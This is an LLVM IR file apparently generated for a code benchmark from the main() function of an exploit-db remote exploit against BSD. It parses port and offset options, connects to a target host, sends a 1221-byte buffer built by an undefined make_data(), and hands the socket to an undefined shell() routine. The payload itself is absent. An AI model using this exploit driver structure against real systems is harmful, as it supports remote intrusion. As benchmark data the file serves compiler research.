; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_19924.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_19924.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [5 x i8] c"p:o:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@offset = common dso_local global i8* null, align 8
@optind = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [20 x i8] c"can't resolve host\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"connect\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [1024 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 543, i32* %7, align 4
  br label %13

13:                                               ; preds = %33, %2
  %14 = load i32, i32* %4, align 4
  %15 = load i8**, i8*** %5, align 8
  %16 = call i32 @getopt(i32 %14, i8** %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* @EOF, align 4
  %18 = icmp ne i32 %16, %17
  br i1 %18, label %19, label %34

19:                                               ; preds = %13
  %20 = load i32, i32* %8, align 4
  switch i32 %20, label %28 [
    i32 112, label %21
    i32 111, label %25
  ]

21:                                               ; preds = %19
  %22 = load i32, i32* @optarg, align 4
  %23 = call i8* @atoi(i32 %22)
  %24 = ptrtoint i8* %23 to i32
  store i32 %24, i32* %7, align 4
  br label %33

25:                                               ; preds = %19
  %26 = load i32, i32* @optarg, align 4
  %27 = call i8* @atoi(i32 %26)
  store i8* %27, i8** @offset, align 8
  br label %33

28:                                               ; preds = %19
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @usage(i8* %31)
  br label %33

33:                                               ; preds = %28, %25, %21
  br label %13

34:                                               ; preds = %13
  %35 = load i8**, i8*** %5, align 8
  %36 = load i64, i64* @optind, align 8
  %37 = getelementptr inbounds i8*, i8** %35, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = icmp ne i8* %38, null
  br i1 %39, label %45, label %40

40:                                               ; preds = %34
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @usage(i8* %43)
  br label %45

45:                                               ; preds = %40, %34
  %46 = load i8**, i8*** %5, align 8
  %47 = load i64, i64* @optind, align 8
  %48 = getelementptr inbounds i8*, i8** %46, i64 %47
  %49 = load i8*, i8** %48, align 8
  %50 = call %struct.hostent* @gethostbyname(i8* %49)
  store %struct.hostent* %50, %struct.hostent** %12, align 8
  %51 = icmp eq %struct.hostent* %50, null
  br i1 %51, label %52, label %56

52:                                               ; preds = %45
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 @fprintf(i32 %53, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %55 = call i32 @exit(i32 -1) #4
  unreachable

56:                                               ; preds = %45
  %57 = call i8* (...) @make_data()
  store i8* %57, i8** %9, align 8
  %58 = call i32 @bzero(%struct.sockaddr_in* %11, i32 12)
  %59 = load i32, i32* @AF_INET, align 4
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %59, i32* %60, align 4
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @htons(i32 %61)
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i32 %62, i32* %63, align 4
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %65 = load %struct.hostent*, %struct.hostent** %12, align 8
  %66 = getelementptr inbounds %struct.hostent, %struct.hostent* %65, i32 0, i32 0
  %67 = load i64*, i64** %66, align 8
  %68 = getelementptr inbounds i64, i64* %67, i64 0
  %69 = load i64, i64* %68, align 8
  %70 = inttoptr i64 %69 to %struct.in_addr*
  %71 = bitcast %struct.in_addr* %64 to i8*
  %72 = bitcast %struct.in_addr* %70 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %71, i8* align 4 %72, i64 4, i1 false)
  %73 = load i32, i32* @AF_INET, align 4
  %74 = load i32, i32* @SOCK_STREAM, align 4
  %75 = call i32 @socket(i32 %73, i32 %74, i32 0)
  store i32 %75, i32* %6, align 4
  %76 = icmp slt i32 %75, 0
  br i1 %76, label %77, label %80

77:                                               ; preds = %56
  %78 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %79 = call i32 @exit(i32 -1) #4
  unreachable

80:                                               ; preds = %56
  %81 = load i32, i32* %6, align 4
  %82 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %83 = call i64 @connect(i32 %81, %struct.sockaddr* %82, i32 12)
  %84 = icmp slt i64 %83, 0
  br i1 %84, label %85, label %88

85:                                               ; preds = %80
  %86 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %87 = call i32 @exit(i32 -1) #4
  unreachable

88:                                               ; preds = %80
  %89 = load i32, i32* %6, align 4
  %90 = load i8*, i8** %9, align 8
  %91 = call i32 @write(i32 %89, i8* %90, i32 1221)
  %92 = load i8*, i8** %9, align 8
  %93 = call i32 @free(i8* %92)
  %94 = load i32, i32* %6, align 4
  %95 = call i32 @shell(i32 %94)
  %96 = load i32, i32* %3, align 4
  ret i32 %96
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @make_data(...) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
